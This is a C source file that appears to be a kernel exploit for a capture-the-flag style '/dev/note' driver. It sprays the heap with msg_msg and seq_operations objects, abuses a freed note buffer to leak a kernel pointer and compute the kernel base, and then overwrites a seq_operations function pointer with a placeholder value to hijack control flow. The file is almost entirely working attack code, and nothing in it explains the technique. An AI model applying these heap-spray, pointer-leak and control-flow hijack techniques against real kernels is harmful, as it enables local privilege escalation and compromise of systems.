#include <string.h> 
#include <stdio.h> 
#include <fcntl.h> 
#include <stdint.h> 
#include <unistd.h> 
#include <assert.h> 
#include <stdlib.h> 
#include <signal.h> 
#include <poll.h> 
#include <pthread.h> 
#include <err.h> 
#include <errno.h> 
#include <sched.h> 
#include <linux/bpf.h> 
#include <linux/filter.h> 
#include <linux/userfaultfd.h> 
#include <linux/prctl.h> 
#include <sys/syscall.h> 
#include <sys/ipc.h> 
#include <sys/msg.h> 
#include <sys/prctl.h> 
#include <sys/ioctl.h> 
#include <sys/mman.h> 
#include <sys/types.h> 
#include <sys/xattr.h> 
#include <sys/socket.h> 
#include <sys/uio.h> 


#define NOTE_ALLOC 	0xC12ED001
#define NOTE_FREE  	0xC12ED002
#define NOTE_WRITE	0xC12ED003
#define NOTE_READ 	0xC12ED004

#define DEV_PATH "/dev/note"

#define MSGSPRAY(qid, msgbuf, times) \
	for(int i=0; i<times; i++) {\
		msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext)-0x30, 0);}

typedef struct house{
	unsigned long size;
	unsigned char* buffer;
} house;


int fd;

void note_alloc(unsigned long size)
{
	house hs;
	hs.size = size;
	hs.buffer = NULL;

	ioctl(fd, NOTE_ALLOC, &hs);
}

void  note_free()
{
	house hs;
	hs.size = 0;
	hs.buffer = NULL;
	ioctl(fd, NOTE_FREE, &hs);
}

void note_write(unsigned char* buf, unsigned long size)
{
	house hs;
	hs.size = size;
	hs.buffer = buf;

	ioctl(fd, NOTE_WRITE, &hs);
}


void note_read(unsigned char* buf, unsigned long size)
{
	house hs;
	hs.size = size;
	hs.buffer = buf;

	ioctl(fd, NOTE_READ, &hs);
}

void open_dev()
{	
	fd = open(DEV_PATH, 0);
	if(fd  < 0)
	{
		puts("[!] Failed to open dev");
		exit(-1);
	}
	puts("[+] Open /dev/note done !");
	return ;
}


struct msgbuf_80 {
	long mtype;
	char mtext[0x80];
};




int main()
{

	unsigned char buffer[0x100];
	int qid; 
	unsigned long kernel_base, call_usermodehelper_exec_work;

	open_dev();
	qid = msgget(IPC_PRIVATE, IPC_CREAT | IPC_EXCL);
	if(qid == -1){
		puts("[!] Failed to msgget");
		exit(-1);
	}
	struct msgbuf_80 msgbuf = {.mtype = 1};
	memset(msgbuf.mtext, '1', 0x50);

	MSGSPRAY(qid, msgbuf, 0x30);

	note_alloc(0x80);
	memset(buffer, 'a', 0x80);
	note_write(buffer, 0x80);		// vuln
	note_free();

	MSGSPRAY(qid, msgbuf, 0x1);		// space at free'd note


	memset(buffer, 0, 8);			// make work_struct.work.data = 0	
	note_alloc(0x80);
	note_write(buffer, 0x80);		// overwrite

	// get subprocess_info
	socket(22, AF_INET, 0);
	note_read(buffer, 0x80);

	call_usermodehelper_exec_work = ((unsigned long*)buffer)[0x3];
	kernel_base = call_usermodehelper_exec_work - 0x60160;
	printf("[*] call_usermodehelper_exec_work: 0x%lx\n", call_usermodehelper_exec_work);
	printf("[*] kernel_base: 0x%lx\n", kernel_base);
	note_free();

	// heap spray seq_operations
	int sfd;
	for(int i=0; i<0x85; i++)
	{
		sfd = open("/proc/self/stat", 0);
	}
	puts("[+] Heap Spray seq_operations done.");

	note_alloc(0x20);
	memset(buffer, 'B', 0x20);
	note_write(buffer, 0x20);
	note_free();


	note_alloc(0x20);						// A
	sfd = open("/proc/self/stat", 0);		// padding
	sfd = open("/proc/self/stat", 0);		// target

	*((unsigned long*)buffer) = 0xdeadbeef;

	note_write(buffer, 0x20);

	// trigger
	read(sfd, buffer, 1);

	return 0;
}